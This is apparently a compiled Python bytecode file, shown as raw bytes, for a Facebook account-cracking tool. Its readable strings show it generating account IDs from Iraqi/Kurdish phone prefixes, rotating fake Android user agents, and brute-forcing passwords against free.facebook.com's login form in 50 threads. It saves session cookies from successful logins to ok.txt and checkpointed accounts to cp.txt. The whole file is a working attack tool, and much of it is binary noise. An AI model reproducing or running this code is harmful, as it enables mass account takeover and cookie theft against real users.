�
    i1�cD  �                   �j  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	 e j
        d�  �         d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n+# e$ r#  e j
        d	�  �          e j
        d
�  �         Y nw xY w G d� d�  �        ZdZdZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1d Z2e#e"e%e$e'e&e)e(gZ3 ej4        e3�  �        Z5 ej6        �   �         Z6e6�7                    d!�  �        Z8 ej6        �   �         Z9e9j:        Z;e9j<        Z=e9j>        Z? ej@        �   �         Z@d"ZAd aBg aCg aDd#� ZEd d$lmFZG d d%l m
ZH  eI eG�   �         d&         �  �        ZJeJd'k    reJd'z
  ZKd(ZLneJZKd)ZL	  eMd*�  �         d+ZNd,ZOd,ZO ePeN�  �        eOv r e j
        d-�  �         n	 n#   eMd.�  �         Y nxY wd/� ZQg ZRg ZS eTd0�  �        D ]�ZUd1ZV ej4        g d2��  �        ZWd3ZX ej4        g d4��  �        ZY ejZ        d5d6�  �        Z[ ej4        g d4��  �        Z\d7Z] ejZ        d8d9�  �        Z^d:Z_ ejZ        d;d<�  �        Z` ejZ        d=d>�  �        Zad?ZbeV� d@eW� dAeX� eY� e[� e\� dBe]� e^� dCe_� dCe`� dCea� d@eb� �ZceS�d                    ec�  �         ��dD� Z_dE� Ze e_�   �          dS )F�    Nzgit pull)�BeautifulSoup)�date)�datetime)�sleep)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4c                   �   � e Zd Zd� ZdS )�jalanc                 �   � |dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )N�
g;�O��n�?)�sys�stdout�write�flush�timer   )�self�z�es      �ND.py�__init__zjalan.__init__   s\   � ��T�� 	� 	�A��J���Q�����J�������J�u�����	� 	�    N)�__name__�
__module__�__qualname__r   � r   r   r
   r
      s#   � � � � � �� � � � r   r
   z[1;35mz[1;32mz[1;97mz[1;33mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz%H:%Ma  
[1;91m ______   ______     ______     ______  
[1;91m/\  ___\ /\  __ \   /\  ___\   /\__  _\ 
[1;97m\ \  __\ \ \  __ \  \ \___  \  \/_/\ \/ 
[1;32m \ \_\    \ \_\ \_\  \/\_____\    \ \_\ 
[1;32m  \/_/     \/_/\/_/   \/_____/     \/_/ 
                                        
c                  �V   � t          j        d�  �         t          t          �  �         d S )N�clear)�os�system�print�logor   r   r   r   r   P   s!   � ��I�g����	�$�K�K�K�K�Kr   )�	localtime)r   �   �   �PM�AMz"

[1;33mWAIT FOR UPDATING [0;97mg������@z5.2r   z
[1;31mNO INTERNET... [0;97mc                 �   � g d�}|D ]J}t          d| z   |z   �  �        f t          j        �                    �   �          t	          j        d�  �         �Kd S )N)z.   z..  z... z.... ��   )r    r   r   r   r   r   )�text�titik�os      r   �dynamicr-   h   sa   � �*�*�*�E�� )� )���d�4�i��k������
������4�:�a�=�=�=�=�)� )r   i'  zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9�10�11�12�13�14�15�16�17z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zr)   i�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.c                  ��  � g } g }t           j         t           j         t          j        d�  �         t	          t
          �  �         t	          d�  �         t	          d�  �         t          d�  �        }t          j        d�  �         t          d�  �         t          t          d�  �        �  �        }t          |�  �        D ]C}d�
                    d� t          d	�  �        D �   �         �  �        }| �                    |�  �         �Dt          j        d�  �         t          t
          �  �         t          t          d
�  �        �  �        }g }t          d�  �         t          |�  �        D ]&}t          d�  �        }	|�                    |	�  �         �'t          d��  �        5 }
t          �   �          t          t          | �  �        �  �        }t          d|z   �  �         t          d�  �         t          d�  �         | D ]I}|dd �         g}||z   }|D ]}|�                    |�  �         �|
�                    t"          |||�  �         �J	 d d d �  �         n# 1 swxY w Y   t          d�  �         d S )Nr   z#[1;37m	 CRACK FOR KURDISH OR IRAQIzf[1;36m     	 CODE PHONE NUMBER
     [1;32m964780, [1;36m964770 ,[1;35m964751 ,[1;34m964750[0;97mz CODE : z$CHAND IDS AWE DAINE NMUNA BNUSA 3000zCHAND IDS AWE BO CRACK :- � c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)�random�choice�string�digits)�.0�_s     r   �	<genexpr>zi.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�Er   �   u   [°|°] CHAND PASS DADANEY : u   [°|°] PASSWORD DABNE : �2   )�max_workersz[1;91m IDS: z$[1;97m ONLY SUPPORT KOREK FOR CRACKz([1;32m#################################r)   z[1;34m >_CRACK TAWAW_<)r   �getuid�geteuidr   r
   r!   �inputr    �int�range�join�append�
ThreadPoolr   �str�len�submit�rcrack)�user�twf�code�limit�nmbr�nmp�passx�HamiiID�bilal�pww�manshera�tl�love�pwx�uid�Emans                   r   �ir�   �   s�  � �	�D�	�C��I�I��J�J��I�g����	�$�K�K�K� 
�
3�4�4�4�	�  G�  H�  H�  H�����D��I�g����	�
0�1�1�1���2�3�3�4�4�E��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C������I�g����	�$�K�K�K���5�6�6�7�7�E��G�	�"�I�I�I��u��� � ���/�0�0�����s�����	��	#�	#�	#� /�x�������T���^�^��� ��#�$�$�$��7�8�8�8��;�<�<�<�� 	/� 	/�D�����8�*�C��t�)�C�� !� !���
�
�4� � � � ��O�O�F�3�s�2�.�.�.�.�	/�/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /� 
�
&�'�'�'�'�'s   �B'I�I�Ic                 �  � 	 |D �]H}t          j        t          �  �        }t          j        �   �         }|�                    d�  �        j        }t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        dd| |dd	�	}i d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d'�d(d)�d*d+�d,d-|d.��}|�                    d/||�0�  �        j        }	|j        �                    �   �         �                    �   �         }
d1|
v r�d2�                    d3� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d4d5�         }t#          d6|z   d7z   |z   d8z   |z   d9z   |z   d:z   �  �         t%          ||�  �         t'          d;d<�  �        �                    |d7z   |z   d=z   �  �         t*          �                    |�  �         t/          t0          ||�  �          n�d>|
v r�d2�                    d?� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d@dA�         }t#          dB|z   d7z   |z   d:z   �  �         t'          dCd<�  �        �                    |d7z   |z   dDz   �  �         t2          �                    |�  �          n��Jt4          dz  at6          j        �                    dEt:          �dFt4          �dG|�dHt=          t*          �  �        �dIt=          t2          �  �        �dJ��  �        f t6          j        �                    �   �          d S #  Y d S xY w)KNzhttps://free.facebook.comzname="lsd" value="(.*?)"r)   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"rY   zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�login�	authorityzfree.facebook.com�method�GET�scheme�https�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=1zcache-controlz#no-cache, no-store, must-revalidate�refererzhttps://t.facebook.com/z	sec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"zsec-ch-ua-mobilez?1zsec-ch-ua-platform�Windowszsec-fetch-dest�documentzsec-fetch-mode�navigatezsec-fetch-sitezsame-originzsec-fetch-userz?0�pragmazno-cache�priorityzu=0zcross-origin�1)zcross-origin-resource-policyzupgrade-insecure-requestsz
user-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S ��=r   �re   �key�values      r   �
<listcomp>zrcrack.<locals>.<listcomp>�   �$   � �a�a�a���U�s�3�w�u�}�a�a�ar   rh   �   z    [1;32mOK =  z | z  
 [1;97mCOOKES = [1;97mz 
 z	  [0;97mz/sdcard/ok.txt�ar   �
checkpointc                 �$   � g | ]\  }}|d z   |z   ��S r�   r   r�   s      r   r�   zrcrack.<locals>.<listcomp>�   r�   r   �   �'   z    [1;30mCP = z/sdcard/cp.txtz 
z               �[�/z]  [OK:z]  [CP:z] ) ra   rb   �ugen�requests�Session�getr*   �re�searchrs   �group�post�cookies�get_dict�keysrp   �itemsr    �cek_apk�openr   �oksrq   �followr   �cps�loopr   r   rD   rt   r   )r�   r�   r�   �ps�pro�session�free_fb�log_data�header_freefb�lo�log_cookies�coki�cids                r   rv   rv   �   sp  � �;�� 5	� 5	�B��-��%�%�C��&�(�(�G��k�k�"=�>�>�C�G��i� :�C��L�L�I�I�O�O�PQ�R�R��i� >��G���M�M�S�S�TU�V�V��9�8�#�g�,�,�G�G�M�M�a�P�P���4�c�'�l�l�C�C�I�I�!�L�L��!$����	� 	�H��[�*=� ��e���g�� �  `�� �2�	�
 �~�� �B�� �0�� �Y�� ��� !�)�� �j�� �j�� �m�� �d�� �j��  ��!�" -;�),��'� � �M�( ���b�hp�  zG��  H�  H�  M�B���0�0�2�2�7�7�9�9�K��;�&�&��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���1�R�4�j���,�c�1�5�8�"�<�Ae�e�fj�j�ms�s�tw�w�  yG�  G�  H�  H�  H����%�%�%��%�s�+�+�1�1�3�u�9�R�<��3D�E�E�E��
�
�3�����t�W�d�+�+�+�����,�,��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���2�b�5�k���*�C�/��6��:�m�S�T�T�T��%�s�+�+�1�1�3�u�9�R�<��3E�F�F�F��
�
�3��������a����
����A�A�A�d�d�d�SU�SU�SU�VY�Z]�V^�V^�V^�V^�_b�cf�_g�_g�_g�_g�h�i�i�j�j��
���������������s   �OO �O)fr   r   r   �jsonra   r�   rc   �platform�base64�uuidr   �bs4r   �sopr�   �ressr   r   r   �waktu�concurrent.futuresr   rr   �	mechanize�requests.exceptionsr   �ModuleNotFoundErrorr
   �ORANGE�GREEN�WHITE�BLUE�YELLOW�REDrI   rL   rG   rD   rQ   r>   rJ   rK   �BNr=   �BBL�BP�BB�BK�BH�BM�BA�my_colorrb   �warna�now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayr!   r�   r�   r�   r   r"   �lt�cmdrn   �ltxr�   �tagr    �v�updaters   r-   �ugen2r�   ro   �xd�aa�b�c�d�	randranger   �f�g�hr�   �j�k�l�uaku2rq   rv   r   r   r   �<module>r
     s8  �� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� 	��	�*� � � � $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �!��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� !� !� !��B�I�I�J�J�J��B�I�� � � � � �!����� � � � � � � � 
��������	���������������������������������������A�q�!�Q��1�a������h�����h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
����2�� 	������� � � !�  �  �  �  �  � � � � � � �	�c�"�"�$�$�q�'�l�l����8�8��B��A�
�C�C��A�
�C�6�	�E�
6�7�7�7��A��F��F�
�s�1�v�v������	�'�����	��� 5�u�u�4�5�5�5�5�5����)� )� )� 	����
�%��,�,� � �B�'�B��f�m�Y�Y�Y�Z�Z�A��A��f�m�  V�  V�  V�  W�  W�A��f��q�#���A��f�m�  V�  V�  V�  W�  W�A�6�A��f��r�#���A�	�A��f��t�D�!�!�A��f��r�#���A��A��<�<�1�<�<��<�1�<�a�<��<�<�a�<��<�<�Q�<�<��<�<�Q�<�<��<�<�E��K�K������'(� '(� '(�RA� A� A�F ������s   �"A7 �7%B�B�0G �G